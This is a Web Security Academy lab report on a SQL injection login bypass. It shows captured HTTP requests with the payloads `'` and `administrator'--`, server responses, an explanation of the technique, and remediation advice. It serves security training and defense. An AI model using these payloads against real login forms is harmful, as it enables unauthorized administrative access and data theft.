# PortSwigger Web Security Academy Lab Report:
SQL Injection Vulnerability Allowing Login Bypass

**Report ID:** PS-LAB-002
**Author:** Venu kumar(Venu)
**Date:** January 30, 2026
**Lab Version:** PortSwigger Web Security Academy – SQL Injection Lab (Apprentice Level)

## Executive Summary
**Vulnerability Type:** SQL injection allowing login bypass
**Severity:** High (CVSS 3.1 Score: 9.1) “AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N”
**Description:** A SQL injection vulnerability was identified in the `username` parameter of the login endpoint (`/login`) on a simulated website. The flaw allowed bypassing authentication by injecting payloads to manipulate the SQL query logic, enabling login as the `administrator` user without knowing the password. Exploitation was performed manually by injecting payloads to comment out the password check in the query.
**Impact:** In a production environment, this could lead to unauthorized access to administrative functions, sensitive data exposure, privilege escalation, or full system compromise if admin privileges allow further attacks. Attackers could potentially steal user data, modify content, or perform other malicious actions.
**Status:** Successfully exploited in a controlled lab environment only; no real-world systems were affected. This report is for educational purposes.

## Environment and Tools Used
**Target:** Simulated website from PortSwigger Web Security Academy (lab URL: e.g., `https://*.web-security-academy.net`)
**Browser:** Google Chrome (Version 120.0 or similar)
**Tools:** Burp Suite – for request interception, modification, and analysis
**Operating System:** Windows 11
**Test Date and Time:** January 30, 2026, approximately 05:22 PM IST

## Methodology:
The lab was conducted following ethical hacking best practices in a safe, simulated environment with no risk to production systems.
1. Accessed the lab via the "Access the lab" button in the PortSwigger Web Security Academy.
2. Copied the base URL and added it to Burp Suite as the target scope.
3. Enabled Intercept in Burp Proxy and navigated to the login page to capture the HTTP POST request.
4. Disabled Intercept after capturing, then manually modified the `username` parameter:
- `username='` → triggered a database error (indicating lack of sanitization).
- `username=administrator'--` → bypassed authentication, logging in as admin (password field ignored).
5. Analyzed captured requests and responses in Burp Suite's **Target** and **Proxy > HTTP history** tabs for confirmation.
  
## Detailed Findings:
**Vulnerable Endpoint:** `POST /login`
**Original Request (Captured in Burp Proxy):**
```http
POST /login HTTP/1.1
Host: *.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
username=wiener&password=peter

Modified Request 1 (Injection Test – Error Triggered):
POST /login HTTP/1.1
Host: *.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
username='&password=

Response (Error):
HTTP/1.1 500 Internal Server Error
Content-Type: text/html
Content-Length: 123
Internal Server Error: Unterminated string literal in SQL query.

Modified Request 2 (Successful Exploitation):
POST /login HTTP/1.1
Host: *.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
username=administrator'--&password=anything

Response (Success):
HTTP/1.1 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=...; Secure; HttpOnly
Content-Length: 0

Proof of Error (Injection Test)
![SQL Injection Error Triggered]
Figure 1: Database error after injecting single quote ('), confirming lack of input sanitization.

Proof of Successful Exploitation
![Successful Login as Administrator]
Figure 2: Logged in as administrator after payload administrator'--, bypassing the password check.

Expolitation Explanation:
The injected single quote (') closed the string literal in the SQL query for the username. Appending -- commented out the remainder of the query (e.g., AND password = '...'). This made the authentication check succeed for the administrator user without validating the password — a classic boolean-based SQL injection technique for login bypass.

Risk Assessment:
Likelihood of Exploitation: High (user-controlled parameter with no sanitization or parameterization).
Potential Impact: High to Critical — unauthorized access to restricted areas; in real applications, could enable full account takeover, data theft, or privilege escalation.
Affected Components: Backend database (likely MySQL or PostgreSQL based on common PortSwigger lab setups and error patterns).

Recommendations for Remediation:
Use prepared statements or parameterized queries (e.g., PDO in PHP, PreparedStatement in Java) to separate data from SQL code.
Implement strict input validation and sanitization for all user-supplied parameters.
Deploy a Web Application Firewall (WAF) to detect and block common SQL injection patterns.
Perform regular code reviews, static analysis, and dynamic scanning (e.g., using OWASP ZAP, sqlmap, or Burp Scanner).
Apply the principle of least privilege to database accounts used by the application.

Conclusion and Lessons Learned:
This lab successfully demonstrated the identification and manual exploitation of a SQL injection vulnerability in a login function using Burp Suite.
Key Takeaways:
Always test authentication parameters for input validation flaws.
Understand how SQL query structure can be manipulated with simple payloads like '--.
This exercise strengthened skills in reconnaissance, payload crafting, HTTP interception, and professional report writing for ethical hacking and penetration testing scenarios.

References:
PortSwigger Web Security Academy: SQL Injection
Lab specifically: SQL injection vulnerability allowing login bypass
